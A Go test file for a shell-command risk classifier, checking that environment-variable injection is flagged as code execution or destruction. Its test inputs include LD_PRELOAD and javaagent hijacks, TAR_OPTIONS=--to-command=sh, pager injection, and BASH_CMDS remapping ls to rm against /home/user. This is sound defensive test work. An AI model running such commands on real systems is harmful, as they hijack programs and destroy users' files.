package danger

import (
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

// unsetExecEnvR4 removes the option-carrying and exec-controlling variables
// from the test process environment for the duration of t, so a name the
// runner happens to export cannot reach a reader.
func unsetExecEnvR4(t *testing.T) {
	t.Helper()
	for _, name := range []string{"TAR_OPTIONS", "ZIPOPT", "ZIP", "UNZIPOPT", "UNZIP", "MAVEN_ARGS", "MAVEN_CONFIG",
		"MAVEN_OPTS", "MAVEN_DEBUG_OPTS", "GRADLE_OPTS", "JAVA_OPTS", "SBT_OPTS", "ANT_OPTS", "CATALINA_OPTS",
		"JAVA_HOME", "JAVACMD", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "JAVA_TOOL_OPTIONS",
		"NODE_OPTIONS", "GIT_PAGER", "LESSOPEN", "GNUPGHOME"} {
		if old, ok := os.LookupEnv(name); ok {
			t.Setenv(name, old) // registers the restore
			os.Unsetenv(name)
		}
	}
}

// kotlinc is in the same toolchain table as mvn and gradle (`kotlinc
// -version` is safe), and its launcher script runs "${JAVACMD:=java}"
// $JAVA_OPTS, taking JAVACMD from $JAVA_HOME/bin/java when unset; the JDK's
// own tools on macOS are /usr/bin stubs that pick the JDK from $JAVA_HOME. The
// reader table listed neither, so these ran the named binary or agent while
// classifying safe. A shell running the Maven or Gradle wrapper script (`sh
// mvnw`) is the same launcher as `./mvnw`, yet only the command word was
// looked up, so the exported agent dropped from system_write to the
// code_execution of the script.
//
// Correct behaviour: every launcher that starts a JVM is a reader of the java
// binary variables (and, for a launcher script whose variables are not
// verified, of JAVA_OPTS too), and a shell running a launcher script reads
// what the script reads.
func TestRED_JVMLaunchersReadJavaEnv(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	for cmd, ref := range map[string]string{
		`JAVA_OPTS=-javaagent:/tmp/x.jar kotlinc -version`:                                    `JAVA_OPTS=-javaagent:/tmp/x.jar gradle --version`,
		`export JAVA_OPTS=-javaagent:/tmp/x.jar; kotlinc -version`:                            `export JAVA_OPTS=-javaagent:/tmp/x.jar; gradle --version`,
		`JAVACMD=/tmp/j kotlinc -version`:                                                     `JAVACMD=/tmp/j mvnw -v`,
		`JAVA_HOME=/tmp/jdk kotlinc -version`:                                                 `JAVA_HOME=/tmp/jdk mvn -v`,
		`printf '#!/bin/sh\nid\n' > /tmp/j; chmod +x /tmp/j; JAVACMD=/tmp/j kotlinc -version`: `printf '#!/bin/sh\nid\n' > /tmp/j; chmod +x /tmp/j; JAVACMD=/tmp/j mvnw -v`,
		`JAVA_HOME=/tmp/jdk java -version`:                                                    `JAVA_HOME=/tmp/jdk mvn -v`,
		`JAVA_HOME=/tmp/jdk javac -version`:                                                   `JAVA_HOME=/tmp/jdk mvn -v`,
		`export JAVA_HOME=./jdk; jar tf x.jar`:                                                `export JAVA_HOME=./jdk; mvn -v`,
		`export MAVEN_OPTS=-javaagent:/tmp/x.jar; sh mvnw -v`:                                 `export MAVEN_OPTS=-javaagent:/tmp/x.jar; mvnw -v`,
		`export MAVEN_OPTS=-javaagent:/tmp/x.jar; bash ./mvnw -v`:                             `export MAVEN_OPTS=-javaagent:/tmp/x.jar; mvnw -v`,
		`GRADLE_OPTS=-javaagent:/tmp/x.jar sh -e gradlew --version`:                           `GRADLE_OPTS=-javaagent:/tmp/x.jar gradlew --version`,
		`MAVEN_ARGS='-s evil.xml' sh mvnw -v`:                                                 `MAVEN_ARGS='-s evil.xml' mvnw -v`,
		`MAVEN_CONFIG='-s evil.xml' bash -- mvnw -v`:                                          `MAVEN_CONFIG='-s evil.xml' mvnw -v`,
	} {
		want := Classify(ref)
		if Rank(want) < Rank(CodeExecution) {
			t.Fatalf("reference %q classified %s; premise broken", ref, want)
		}
		if got := Classify(cmd); Rank(got) < Rank(want) {
			t.Errorf("Classify(%q) = %s, want at least %s (the verdict of %q)", cmd, got, want, ref)
		}
	}
	// Plain values keep the verdict of the script, and an inline script that
	// only names the launcher runs nothing that reads them.
	for cmd, plain := range map[string]string{
		`export MAVEN_OPTS=-Xmx1g; sh mvnw -v`:                      `sh mvnw -v`,
		`export MAVEN_ARGS='-s evil.xml'; sh -c 'echo mvnw'`:        `sh -c 'echo mvnw'`,
		`export JAVA_HOME=/usr/lib/jvm/java-17; bash gradlew build`: `bash gradlew build`,
	} {
		if got, want := Classify(cmd), Classify(plain); got != want {
			t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, plain)
		}
	}
}

// jvmToolNamesR4 lists programs that start a JVM: the JDK's own tools, the
// build launchers and the JVM language launchers.
var jvmToolNamesR4 = []string{
	"java", "javac", "jar", "jarsigner", "javadoc", "javap", "jdeps", "jlink", "jmod", "jpackage", "jshell",
	"jdb", "jcmd", "jconsole", "jinfo", "jmap", "jps", "jstack", "jstat", "jstatd", "jhsdb", "jfr", "keytool",
	"serialver", "rmiregistry", "jwebserver", "jrunscript", "jdeprscan", "jimage", "native2ascii",
	"mvn", "mvnw", "mvnDebug", "mvnd", "gradle", "gradlew", "sbt", "sbtn", "ant", "catalina.sh",
	"kotlinc", "kotlinc-jvm", "kotlin", "scala", "scalac", "scala-cli", "amm", "groovy", "groovyc", "groovysh",
	"lein", "clojure", "clj", "jruby", "jirb", "jython", "jbang", "grails", "spring", "cs", "coursier",
}

// jdkNativeToolsR4 are the JDK's native launchers: they read no launcher
// script variables, but the macOS /usr/bin stubs choose the JDK from
// $JAVA_HOME.
var jdkNativeToolsR4 = map[string]bool{
	"java": true, "javac": true, "jar": true, "jarsigner": true, "javadoc": true, "javap": true, "jdeps": true,
	"jlink": true, "jmod": true, "jpackage": true, "jshell": true, "jdb": true, "jcmd": true, "jconsole": true,
	"jinfo": true, "jmap": true, "jps": true, "jstack": true, "jstat": true, "jstatd": true, "jhsdb": true,
	"jfr": true, "keytool": true, "serialver": true, "rmiregistry": true, "jwebserver": true, "jrunscript": true,
	"jdeprscan": true, "jimage": true, "native2ascii": true,
}

// launcherDoesNotReadR4 records, per launcher script, the variables its
// upstream script is verified not to read: the Maven and Ant scripts take
// their own *_OPTS rather than JAVA_OPTS, and the Gradle start scripts and
// catalina.sh set the java command themselves.
var launcherDoesNotReadR4 = map[string][]string{
	"mvn": {"JAVA_OPTS"}, "mvnw": {"JAVA_OPTS"}, "mvnDebug": {"JAVA_OPTS"}, "ant": {"JAVA_OPTS"},
	"gradle": {"JAVACMD"}, "gradlew": {"JAVACMD"}, "catalina.sh": {"JAVACMD"},
}

// Every program the package knows that starts a JVM, and that does not
// already classify unknown, reads the java binary variables; a launcher
// script whose variables are not verified also reads JAVACMD and JAVA_OPTS.
func TestRED_EveryKnownJVMLauncherReadsJavaEnv(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	known := 0
	for _, name := range jvmToolNamesR4 {
		listed := safeCommands[name] || projectCodeTools[name] || codeEvalPrefixes[name] || writePrefixes[name]
		if !listed && Classify(name+" -version") == Unknown && Classify(name+" --version") == Unknown {
			continue // denied whatever its environment holds
		}
		known++
		cases := map[string]RiskClass{"JAVA_HOME=/tmp/jdk": CodeExecution}
		if !jdkNativeToolsR4[name] {
			cases["JAVACMD=/tmp/j"] = CodeExecution
			cases["JAVA_OPTS=-javaagent:/tmp/x.jar"] = SystemWrite
			for _, v := range launcherDoesNotReadR4[name] {
				for k := range cases {
					if len(k) > len(v) && k[:len(v)+1] == v+"=" {
						delete(cases, k)
					}
				}
			}
		}
		for assign, want := range cases {
			for _, form := range []string{assign + " " + name + " -version", "export " + assign + "; " + name + " -version"} {
				if got := Classify(form); Rank(got) < Rank(want) {
					t.Errorf("Classify(%q) = %s, want at least %s: %s starts a JVM", form, got, want, name)
				}
			}
		}
	}
	if known < 8 {
		t.Fatalf("only %d JVM launchers are known to the classifier; the table walk is not exercising it", known)
	}
}

// nativeToolchainR4 are the entries of the toolchain table (projectCodeTools)
// that start no JVM. Every other entry must be in the reader table, so a
// launcher added to the toolchain table is either listed here on purpose or
// read as a JVM launcher.
var nativeToolchainR4 = fieldSet("cmake ninja meson rustc tsc eslint prettier mypy flake8 rubocop dotnet swift swiftc " +
	"golangci-lint gdb lldb")

// The toolchain table is walked whole: each entry that is not a known native
// tool reads JAVA_HOME, and each launcher script among them the other java
// variables its script is not verified to ignore.
func TestRED_ToolchainTableJVMEntriesAreReaders(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	walked := 0
	for name := range projectCodeTools {
		if nativeToolchainR4[name] {
			if _, reads := optionEnvReaders[name]; reads {
				t.Errorf("%s is listed as a native tool and as a reader", name)
			}
			continue
		}
		walked++
		reads := optionEnvReaders[name]
		if !hasString(reads, "JAVA_HOME") {
			t.Errorf("toolchain entry %s is not a reader of JAVA_HOME (readers: %v)", name, reads)
			continue
		}
		for _, v := range []string{"JAVACMD", "JAVA_OPTS"} {
			if !jdkNativeToolsR4[name] && !hasString(launcherDoesNotReadR4[name], v) && !hasString(reads, v) {
				t.Errorf("toolchain launcher %s is not a reader of %s", name, v)
			}
		}
		for _, form := range []string{"JAVA_HOME=/tmp/jdk " + name + " -version", "export JAVA_HOME=/tmp/jdk; " + name + " -version"} {
			if got := Classify(form); Rank(got) < Rank(CodeExecution) {
				t.Errorf("Classify(%q) = %s, want at least code_execution", form, got)
			}
		}
	}
	if walked < 6 {
		t.Fatalf("only %d JVM entries in the toolchain table; the walk is not exercising it", walked)
	}
	// Every reader of a JVM variable is in the hand-kept list the per-launcher
	// test walks, so the two cannot drift apart.
	for name, reads := range optionEnvReaders {
		if hasString(reads, "JAVA_HOME") && !hasString(jvmToolNamesR4, name) {
			t.Errorf("reader %s is missing from jvmToolNamesR4", name)
		}
	}
}

// execVarCaseR4 is an exec-controlling variable, a value and a command that
// reads it.
type execVarCaseR4 struct{ name, value, reader string }

// execVarCasesR4 lists every variable the package treats as controlling what
// a program runs: the loader, hook and config names (envExecNames), pagers,
// git config injection, the shell startup variables, the code variables and
// the option-carrying variables, each with a reader.
func execVarCasesR4() []execVarCaseR4 {
	var out []execVarCaseR4
	names := make([]string, 0, len(envExecNames))
	for name := range envExecNames {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		reader := "ls"
		switch {
		case strings.HasPrefix(name, "GIT_"):
			reader = "git log"
		case name == "NODE_OPTIONS":
			reader = "node -v"
		case strings.Contains(name, "JAVA"):
			reader = "java -version"
		case strings.HasPrefix(name, "LESS"):
			reader = "less x"
		}
		out = append(out, execVarCaseR4{name, "/tmp/x", reader})
	}
	return append(out,
		execVarCaseR4{"GIT_PAGER", "'sh -c id'", "git log"},
		execVarCaseR4{"MANPAGER", "/tmp/x", "man ls"},
		execVarCaseR4{"GIT_CONFIG_KEY_0", "core.pager", "git log"},
		execVarCaseR4{"GIT_CONFIG_VALUE_0", "'sh -c id'", "git log"},
		execVarCaseR4{"ENV", "/tmp/x", "sh -c id"},
		execVarCaseR4{"SHELL", "/tmp/x", "man ls"},
		execVarCaseR4{"GIT_TRACE2", "/tmp/x", "git status"},
		execVarCaseR4{"HOME", "/tmp", "bash -l"},
		execVarCaseR4{"ZDOTDIR", "/tmp", "zsh -c id"},
		execVarCaseR4{"XDG_CONFIG_HOME", "/tmp", "git log"},
		execVarCaseR4{"PROMPT_COMMAND", "'rm -rf /home/user'", "bash -i"},
		execVarCaseR4{"PS1", "'$(id)'", "bash -i"},
		execVarCaseR4{"GNUPGHOME", "/tmp/g", "gpg --list-keys"},
		execVarCaseR4{"TAR_OPTIONS", "--to-command=sh", "tar xf x.tar"},
		execVarCaseR4{"ZIPOPT", "-m", "zip a.zip f"},
		execVarCaseR4{"UNZIP", "'-o -d /etc'", "unzip a.zip"},
		execVarCaseR4{"MAVEN_ARGS", "'-s evil.xml'", "mvn -v"},
		execVarCaseR4{"MAVEN_CONFIG", "'-s evil.xml'", "mvnw -v"},
		execVarCaseR4{"MAVEN_OPTS", "-javaagent:/tmp/x.jar", "mvn -v"},
		execVarCaseR4{"GRADLE_OPTS", "-javaagent:/tmp/x.jar", "gradle --version"},
		execVarCaseR4{"JAVA_OPTS", "-javaagent:/tmp/x.jar", "kotlinc -version"},
		execVarCaseR4{"SBT_OPTS", "-javaagent:/tmp/x.jar", "sbt -version"},
		execVarCaseR4{"JAVA_HOME", "/tmp/jdk", "mvn -v"},
		execVarCaseR4{"JAVACMD", "/tmp/j", "mvnw -v"},
	)
}

// bindFormsR4 are the ways a statement hands a variable to the commands after
// it; op is "=" or "+=".
var bindFormsR4 = map[string]func(name, op, value, reader string) string{
	"export":          func(n, op, v, r string) string { return "export " + n + op + v + "; " + r },
	"declare -x":      func(n, op, v, r string) string { return "declare -x " + n + op + v + "; " + r },
	"typeset -x":      func(n, op, v, r string) string { return "typeset -x " + n + op + v + "; " + r },
	"local -x":        func(n, op, v, r string) string { return "f() { local -x " + n + op + v + "; " + r + "; }; f" },
	"readonly+export": func(n, op, v, r string) string { return "readonly " + n + op + v + "; export " + n + "; " + r },
	"declare+export":  func(n, op, v, r string) string { return "declare " + n + op + v + "; export " + n + "; " + r },
	"export --":       func(n, op, v, r string) string { return "export -- " + n + op + v + "; " + r },
	"inline":          func(n, op, v, r string) string { return n + op + v + " " + r },
}

// `export NAME+=value` names NAME exactly like `export NAME=value` (with NAME
// unset, bash and sh assign), but the exec-controlling check on the operands
// of export, declare/typeset/local -x and readonly took only NAME=value words,
// so `export LD_PRELOAD+=/tmp/x.so; ls` was safe; an append to an option
// variable whose earlier value was unknown held only "a run-time value",
// which dropped the --to-command the same words carry after `=`; and a value
// set by readonly or a declare without -x and exported later by name was never
// judged. The denylist's own variable tracking kept the value from before an
// append, so `cmd=git; export cmd+=' push'; $cmd` missed a `git push` entry.
//
// Correct behaviour: every += form classifies at least as high as its = form,
// a declaration that does not export judges the exec-controlling names it
// sets as a plain assignment of them is judged, and the denylist follows the
// append.
func TestRED_AppendFormsJudgedLikeAssignments(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	for _, tc := range []struct{ cmd, ref string }{
		{`export LD_PRELOAD+=/tmp/x.so; ls`, `export LD_PRELOAD=/tmp/x.so; ls`},
		{`declare -x LD_PRELOAD+=/tmp/x.so; ls`, `export LD_PRELOAD=/tmp/x.so; ls`},
		{`typeset -x LD_PRELOAD+=/tmp/x.so; ls`, `export LD_PRELOAD=/tmp/x.so; ls`},
		{`export -- LD_PRELOAD+=/tmp/x.so; ls`, `export LD_PRELOAD=/tmp/x.so; ls`},
		{`f() { local -x LD_PRELOAD+=/tmp/x.so; ls; }; f`, `export LD_PRELOAD=/tmp/x.so; ls`},
		{`export LD_LIBRARY_PATH+=/tmp; ls`, `export LD_LIBRARY_PATH=/tmp; ls`},
		{`export JAVA_TOOL_OPTIONS+=-javaagent:/tmp/x.jar; java -version`, `export JAVA_TOOL_OPTIONS=-javaagent:/tmp/x.jar; java -version`},
		{`export NODE_OPTIONS+='--require /tmp/x.js'; node -v`, `export NODE_OPTIONS='--require /tmp/x.js'; node -v`},
		{`export GIT_PAGER+='sh -c id'; git log`, `export GIT_PAGER='sh -c id'; git log`},
		{`export LESSOPEN+='|sh -c id %s'; less x`, `export LESSOPEN='|sh -c id %s'; less x`},
		{`base64 -d <<< UEsDBA== > /tmp/a.so; export LD_PRELOAD+=/tmp/a.so; ls`, `base64 -d <<< UEsDBA== > /tmp/a.so; export LD_PRELOAD=/tmp/a.so; ls`},
		{`readonly LD_PRELOAD=/tmp/x.so; export LD_PRELOAD; ls`, `LD_PRELOAD=/tmp/x.so; export LD_PRELOAD; ls`},
		{`declare LD_PRELOAD+=/tmp/x.so; export LD_PRELOAD; ls`, `LD_PRELOAD=/tmp/x.so; export LD_PRELOAD; ls`},
		{`export TAR_OPTIONS+=--to-command=sh; tar xf x.tar`, `export TAR_OPTIONS=--to-command=sh; tar xf x.tar`},
	} {
		want := Classify(tc.ref)
		if Rank(want) < Rank(SystemWrite) && !strings.Contains(tc.ref, "TAR_OPTIONS") {
			t.Fatalf("reference %q classified %s; premise broken", tc.ref, want)
		}
		if got := Classify(tc.cmd); Rank(got) < Rank(want) {
			t.Errorf("Classify(%q) = %s, want at least %s (the verdict of %q)", tc.cmd, got, want, tc.ref)
		}
	}
	forms := make([]string, 0, len(bindFormsR4))
	for form := range bindFormsR4 {
		forms = append(forms, form)
	}
	sort.Strings(forms)
	for _, c := range execVarCasesR4() {
		for _, form := range forms {
			build := bindFormsR4[form]
			assign, appendCmd := build(c.name, "=", c.value, c.reader), build(c.name, "+=", c.value, c.reader)
			want := Classify(assign)
			if got := Classify(appendCmd); Rank(got) < Rank(want) {
				t.Errorf("Classify(%q) = %s, want at least %s (the verdict of %q)", appendCmd, got, want, assign)
			}
			// A name judged by itself is judged however the value is bound.
			if envExecNames[c.name] && Rank(want) < Rank(SystemWrite) {
				t.Errorf("Classify(%q) = %s, want at least system_write", assign, want)
			}
		}
	}
	if !denylistMatch(`cmd=git; export cmd+=' push'; $cmd`, []string{"git push"}) {
		t.Error("denylist `git push` must match a value completed by an append")
	}
	if denylistMatch(`cmd=git; export cmd+=' status'; $cmd`, []string{"git push"}) {
		t.Error("denylist `git push` must not match `git status`")
	}
}

// The JVM property table matched exact names and listed only some of the
// properties that move where a build tool or the JVM loads code, JDKs,
// plugins and repositories from, so `SBT_OPTS='-Dsbt.ivy.home=/tmp/ivy' sbt
// -version` and `GRADLE_OPTS='-Dorg.gradle.java.installations.paths=/tmp/jdk'
// gradle --version` kept the verdict of the tool alone.
//
// Correct behaviour: a property that redirects a code, JDK, plugin or
// repository location is system_write; a property that names none stays
// plain.
func TestRED_JVMPropertiesThatRedirectCodeLocations(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	readers := map[string]string{
		"SBT_OPTS": "sbt -version", "GRADLE_OPTS": "gradle --version", "MAVEN_OPTS": "mvn -v",
		"JAVA_OPTS": "kotlinc -version", "ANT_OPTS": "ant -version",
	}
	vars := make([]string, 0, len(readers))
	for v := range readers {
		vars = append(vars, v)
	}
	sort.Strings(vars)
	for _, prop := range []string{
		"sbt.ivy.home=/tmp/ivy", "sbt.boot.directory=/tmp/b", "sbt.global.base=/tmp/g",
		"sbt.repository.config=/tmp/repos", "sbt.override.build.repos=true",
		"org.gradle.java.installations.paths=/tmp/jdk", "org.gradle.java.home=/tmp/jdk", "gradle.user.home=/tmp/g",
		"maven.repo.local=/tmp/repo", "maven.home=/tmp/m", "settings.security=/tmp/s.xml",
		"java.home=/tmp/jdk", "user.home=/tmp", "java.class.path=/tmp/x.jar", "java.system.class.loader=Evil",
		"java.security.manager=Evil", "java.security.policy=/tmp/p", "java.security.properties=/tmp/p",
		"java.security.egd=file:/tmp/x", "java.security.auth.login.config=/tmp/jaas.conf",
	} {
		for _, v := range vars {
			for _, cmd := range []string{
				v + "='-D" + prop + "' " + readers[v],
				"export " + v + "=-D" + prop + "; " + readers[v],
			} {
				if got := Classify(cmd); Rank(got) < Rank(SystemWrite) {
					t.Errorf("Classify(%q) = %s, want at least system_write", cmd, got)
				}
			}
		}
	}
	for _, prop := range []string{
		"context=dev", "next.token=1", "http.agent=x", "file.encoding=UTF-8", "user.timezone=UTC",
		"spring.profiles.active=dev", "java.awt.headless=true", "user.language=en", "sbt.log.noformat=true",
		"org.gradle.daemon=false", "maven.test.skip=true", "java.net.preferIPv4Stack=true",
	} {
		for _, v := range vars {
			cmd, plain := v+"='-D"+prop+"' "+readers[v], readers[v]
			if got, want := Classify(cmd), Classify(plain); got != want {
				t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, plain)
			}
		}
	}
}

// The java binary variables were tested for run-time text before the shell's
// own expansion of the value, so a JAVA_HOME spelled with $HOME (how SDKMAN
// and asdf write it) was code_execution while the same path spelled ~/ was
// plain; and the binary was compared with the directory odek runs in, not the
// one the launcher runs in after an earlier `cd`, which with the home
// directory as the workspace made every JDK a manager installed under it a
// working-directory binary.
//
// Correct behaviour: the value is resolved first, the directory is the one
// the command runs in, and the directories JDKs are installed into are not
// project files; a JDK in the project tree or a temporary directory stays
// code_execution.
func TestRED_JavaBinaryResolvedBeforeItIsJudged(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	for cmd, plain := range map[string]string{
		`JAVA_HOME=$HOME/.sdkman/candidates/java/current mvn -v`:           `mvn -v`,
		`JAVA_HOME=${HOME}/.asdf/installs/java/temurin-21 mvn -v`:          `mvn -v`,
		`JAVACMD=$HOME/.sdkman/candidates/java/current/bin/java mvnw -v`:   `mvnw -v`,
		`JAVA_HOME=~/.sdkman/candidates/java/current mvn -v`:               `mvn -v`,
		`export JAVA_HOME=$HOME/.jenv/versions/21; mvn -v`:                 `mvn -v`,
		`JAVA_HOME=/usr/lib/jvm/java-21-openjdk mvn -v`:                    `mvn -v`,
		`JAVA_HOME=$HOME/tools/jdk-21 mvn -v`:                              `mvn -v`,
		`JAVA_HOME=/Library/Java/JavaVirtualMachines/x/Contents/Home java`: `java`,
	} {
		if got, want := Classify(cmd), Classify(plain); got != want {
			t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, plain)
		}
	}
	for _, cmd := range []string{
		`JAVA_HOME=./jdk mvn -v`,
		`JAVA_HOME=$PWD/jdk mvn -v`,
		`JAVA_HOME=/tmp/jdk mvn -v`,
		`JAVA_HOME=$TMPDIR/jdk mvn -v`,
		`JAVACMD=jdk/bin/java mvnw -v`,
		`JAVA_HOME=$UNSET_BY_THE_RUNNER/jdk mvn -v`,
		`JAVA_HOME=$(pwd)/jdk mvn -v`,
		`HOME=/tmp/h JAVA_HOME=$HOME/.sdkman/candidates/java/current mvn -v`,
		`read HOME; JAVA_HOME=$HOME/.sdkman/candidates/java/current mvn -v`,
		`HOME=/tmp/h; JAVA_HOME=$HOME/.sdkman/candidates/java/current mvn -v`,
	} {
		if got := Classify(cmd); Rank(got) < Rank(CodeExecution) {
			t.Errorf("Classify(%q) = %s, want at least code_execution", cmd, got)
		}
	}

	// The directory the launcher runs in is the one an earlier cd names.
	root := t.TempDir()
	t.Setenv("HOME", root)
	t.Setenv("TMPDIR", filepath.Join(root, "no-such-tmp"))
	if strings.HasPrefix(root, "/tmp/") || strings.HasPrefix(root, "/var/tmp/") || strings.HasPrefix(root, "/private/") {
		t.Skip("the test home is inside a temporary directory the classifier lists")
	}
	proj := filepath.Join(root, "proj")
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Chdir(root)
	for cmd, want := range map[string]RiskClass{
		`cd ` + proj + `; JAVA_HOME=` + proj + `/jdk mvn -v`:                        CodeExecution,
		`cd ` + proj + ` && export JAVA_HOME=` + proj + `/jdk && mvn -v`:            CodeExecution,
		`JAVA_HOME=` + root + `/.sdkman/candidates/java/current mvn -v`:             Safe,
		`export JAVA_HOME=$HOME/.asdf/installs/java/temurin-21; mvn -v`:             Safe,
		`JAVA_HOME=` + root + `/jdk mvn -v`:                                         CodeExecution,
		`cd .sdkman/candidates/java; JAVA_HOME=$HOME/.sdkman/candidates/java/x mvn`: CodeExecution,
	} {
		if got := Classify(cmd); Rank(got) < Rank(want) || (want == Safe && got != Classify(`mvn -v`)) {
			t.Errorf("Classify(%q) = %s, want %s", cmd, got, want)
		}
	}
}

// A variable was judged for every later reader once any statement exported
// it, also after a statement took it out of the environment again: `export
// TAR_OPTIONS=--to-command=sh; unset TAR_OPTIONS; tar xf x.tar` runs a plain
// tar, yet classified above it.
//
// Correct behaviour: after unset, export -n or declare/typeset +x at a place
// every later command is certain to follow, the reader keeps its own verdict;
// a later export counts again, and a removal the analysis cannot be sure of
// (a branch, a subshell, a function, a read-only variable, a substitution
// that runs earlier) changes nothing.
func TestRED_UnexportedOptionVariableIsNotJudged(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	const export = `export TAR_OPTIONS=--to-command=sh; `
	plain := Classify(`tar xf x.tar`)
	judged := Classify(export + `tar xf x.tar`)
	if Rank(judged) <= Rank(plain) {
		t.Fatalf("premise: exported form classified %s, plain %s", judged, plain)
	}
	for cmd, ref := range map[string]string{
		export + `export -n TAR_OPTIONS; tar xf x.tar`:                          `tar xf x.tar`,
		export + `unset TAR_OPTIONS; tar xf x.tar`:                              `tar xf x.tar`,
		export + `unset -v TAR_OPTIONS; tar xf x.tar`:                           `tar xf x.tar`,
		export + `declare +x TAR_OPTIONS; tar xf x.tar`:                         `tar xf x.tar`,
		export + `typeset +x TAR_OPTIONS; tar xf x.tar`:                         `tar xf x.tar`,
		export + `unset TAR_OPTIONS; TAR_OPTIONS=--to-command=sh; tar xf x.tar`: `tar xf x.tar`,
		export + `unset TAR_OPTIONS; bash -c 'tar xf x.tar'`:                    `bash -c 'tar xf x.tar'`,
		`TAR_OPTIONS=--to-command=sh bash -c 'unset TAR_OPTIONS; tar xf x.tar'`: `bash -c 'tar xf x.tar'`,
		`export ZIPOPT=-m; unset ZIPOPT; zip a.zip f`:                           `zip a.zip f`,
		`export MAVEN_OPTS=-javaagent:/tmp/x.jar; export -n MAVEN_OPTS; mvn -v`: `mvn -v`,
		`export JAVA_HOME=/tmp/jdk; unset JAVA_HOME; mvn -v`:                    `mvn -v`,
		`export JAVACMD=/tmp/j; unset TAR_OPTIONS JAVACMD; mvn -v`:              `mvn -v`,
	} {
		if got, want := Classify(cmd), Classify(ref); got != want {
			t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, ref)
		}
	}
	// With the name in odek's own environment the removal counts the same.
	t.Setenv("TAR_OPTIONS", "-v")
	if got := Classify(export + `unset TAR_OPTIONS; tar xf x.tar`); got != plain {
		t.Errorf("with TAR_OPTIONS inherited: unset form = %s, want %s", got, plain)
	}
	os.Unsetenv("TAR_OPTIONS")
	for _, cmd := range []string{
		export + `unset TAR_OPTIONS; export TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		export + `export -n TAR_OPTIONS; export TAR_OPTIONS; tar xf x.tar`,
		export + `declare +x TAR_OPTIONS; declare -x TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		export + `unset TAR_OPTIONS; set -a; TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		export + `unset TAR_OPTIONS; TAR_OPTIONS=--to-command=sh tar xf x.tar`,
		export + `unset TAR_OPTIONS; eval 'export TAR_OPTIONS=--to-command=sh'; tar xf x.tar`,
		export + `unset TAR_OPTIONS; . ./env.sh; tar xf x.tar`,
		export + `if test -f nope; then unset TAR_OPTIONS; fi; tar xf x.tar`,
		export + `(unset TAR_OPTIONS); tar xf x.tar`,
		export + `{ unset TAR_OPTIONS; }; tar xf x.tar`,
		export + `false && unset TAR_OPTIONS; tar xf x.tar`,
		export + `true || unset TAR_OPTIONS; tar xf x.tar`,
		export + `unset TAR_OPTIONS | cat; tar xf x.tar`,
		export + `unset TAR_OPTIONS & tar xf x.tar`,
		export + `f() { unset TAR_OPTIONS; }; tar xf x.tar; f`,
		export + `for i in; do unset TAR_OPTIONS; done; tar xf x.tar`,
		export + `bash -c 'unset TAR_OPTIONS'; tar xf x.tar`,
		export + `readonly TAR_OPTIONS; unset TAR_OPTIONS; tar xf x.tar`,
		export + `declare -r TAR_OPTIONS; unset TAR_OPTIONS; tar xf x.tar`,
		export + `unset -f TAR_OPTIONS; tar xf x.tar`,
		export + `unset 'TAR_OPTIONS[1]'; tar xf x.tar`,
		export + `unset TAR; tar xf x.tar`,
		export + `echo "$(tar xf x.tar)"; unset TAR_OPTIONS`,
	} {
		if got := Classify(cmd); Rank(got) <= Rank(plain) {
			t.Errorf("Classify(%q) = %s, want above %s: the variable can still reach tar", cmd, got, plain)
		}
	}
}

// bash reads `BASH_CMDS=( [ls]=/bin/rm )` exactly like the unspaced literal,
// but the words after `BASH_CMDS=(` reached the binding as a command of their
// own and the entry was dropped, so `ls -rf /home/user` kept the verdict of
// ls; the key/value list form (`declare -A BASH_CMDS=(ls /bin/rm)`, bash 5.1+)
// and an arithmetic assignment (`let 'BASH_CMDS[ls]=1'`) bound nothing at all.
//
// Correct behaviour: the spaced literal and the key/value list bind like
// `hash -p`, and an assignment to the table the analysis cannot follow fails
// the command closed.
func TestRED_BashCmdsSpacedAndListLiteralsBind(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	want := Classify(`hash -p /bin/rm ls; ls -rf /home/user`)
	if Rank(want) < Rank(Destructive) {
		t.Fatalf("premise: hash -p form classified %s", want)
	}
	for _, cmd := range []string{
		`BASH_CMDS=([ls]=/bin/rm); ls -rf /home/user`,
		`BASH_CMDS=( [ls]=/bin/rm ); ls -rf /home/user`,
		`BASH_CMDS=( [ls]=/bin/rm); ls -rf /home/user`,
		`BASH_CMDS=([ls]=/bin/rm ); ls -rf /home/user`,
		`BASH_CMDS=( [x]=/bin/true [ls]=/bin/rm ); ls -rf /home/user`,
		`BASH_CMDS+=( [ls]=/bin/rm ); ls -rf /home/user`,
		`declare -A BASH_CMDS=( [ls]=/bin/rm ); ls -rf /home/user`,
		`declare -A BASH_CMDS=(ls /bin/rm); ls -rf /home/user`,
		`declare -A BASH_CMDS=( ls /bin/rm ); ls -rf /home/user`,
		`BASH_CMDS=( x /bin/true ls /bin/rm ); ls -rf /home/user`,
		`BASH_CMDS+=(ls /bin/rm); ls -rf /home/user`,
		// A literal that never closes still binds the elements it lists.
		`declare -A BASH_CMDS=([ls]=/bin/rm; ls -rf /home/user`,
	} {
